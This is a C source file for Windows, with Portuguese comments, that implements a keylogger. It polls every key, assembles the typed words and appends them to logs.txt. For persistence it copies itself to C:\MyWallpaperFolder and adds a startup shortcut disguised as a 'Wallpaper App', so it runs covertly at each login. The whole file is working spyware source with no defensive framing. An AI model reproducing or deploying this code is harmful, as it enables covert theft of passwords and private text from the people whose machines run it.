#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <objbase.h>
#include <wchar.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ctype.h>

bool valPersis();

int main()
{
    FILE *fptr;
    char palavra[100];
    int count = 0;

    if (valPersis())
    {
        while (1)
        {
            for (int vk = 0x08; vk <= 0xFE; vk++)
            {
                if (GetAsyncKeyState(vk) & 0x01)
                {
                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
                    LONG lParam = (scanCode << 16);
                    char keyName[128];

                    if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
                    {
                        // Backspace
                        if (vk == VK_BACK)
                        {
                            if (count > 0)
                            {
                                count--;
                                palavra[count] = '\0';
                            }
                            system("cls");
                            printf("%s", palavra);
                            continue;
                        }

                        // Enter ou espaço
                        if (vk == VK_RETURN || vk == VK_SPACE)
                        {
                            if (count > 0)
                            {
                                palavra[count] = '\0';
                                fptr = fopen("logs.txt", "a");
                                if (fptr)
                                {
                                    fprintf(fptr, "%s\n", palavra);
                                    fclose(fptr);
                                }
                                count = 0;
                                palavra[0] = '\0';
                                system("cls");
                            }
                            continue;
                        }

                        // Letras e números
                        bool shiftPressed = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) ||
                                            ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
                        if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z') || (vk >= 'a' && vk <= 'z'))
                        {
                            if (count < sizeof(palavra) - 1)
                            {
                                char c = (char)vk;
                                if (!shiftPressed)
                                    c = tolower(c);
                                palavra[count++] = c;
                                palavra[count] = '\0';
                            }
                        }
                        system("cls");
                        printf("%s", palavra);
                    }
                }
            }
            Sleep(30);
        }
    }

    return 0;
}

bool valPersis()
{
    FILE *varsConf;
    char linha[50];
    int valor = 0;

    varsConf = fopen("config.cfg", "r");

    if (!varsConf)
    {
        // Configuração inicial
        char currentPath[MAX_PATH];
        char rootPath[MAX_PATH] = "C:\\MyWallpaperFolder";
        char exePath[MAX_PATH];
        char shortcutPath[MAX_PATH];
        char configPath[MAX_PATH];

        GetModuleFileName(NULL, currentPath, MAX_PATH);
        CreateDirectory(rootPath, NULL);

        snprintf(exePath, MAX_PATH, "%s\\main.exe", rootPath);
        CopyFile(currentPath, exePath, FALSE);

        snprintf(configPath, MAX_PATH, "%s\\config.cfg", rootPath);
        varsConf = fopen(configPath, "w");
        if (varsConf)
        {
            fprintf(varsConf, "pos=1\n");
            fclose(varsConf);
        }

        char startupFolder[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolder)))
        {
            snprintf(shortcutPath, MAX_PATH, "%s\\WallpaperShortcut.lnk", startupFolder);

            CoInitialize(NULL);
            IShellLinkA *psl = NULL;
            HRESULT hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                                            &IID_IShellLinkA, (void **)&psl);

            if (SUCCEEDED(hres) && psl)
            {
                // Chamadas corretas via lpVtbl
                psl->lpVtbl->SetPath(psl, exePath);
                psl->lpVtbl->SetDescription(psl, "Wallpaper App");

                IPersistFile *ppf = NULL;
                hres = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void **)&ppf);
                if (SUCCEEDED(hres) && ppf)
                {
                    WCHAR wShortcut[MAX_PATH];
                    MultiByteToWideChar(CP_ACP, 0, shortcutPath, -1, wShortcut, MAX_PATH);
                    ppf->lpVtbl->Save(ppf, wShortcut, TRUE);
                    ppf->lpVtbl->Release(ppf);
                }

                psl->lpVtbl->Release(psl);
            }
            CoUninitialize();
        }

        return false;
    }
    else
    {
        // Ler config.cfg
        if (fgets(linha, sizeof(linha), varsConf))
        {
            if (sscanf(linha, "pos=%d", &valor) == 1)
            {
                fclose(varsConf);
                return valor == 1;
            }
        }
        fclose(varsConf);
    }

    return false;
}
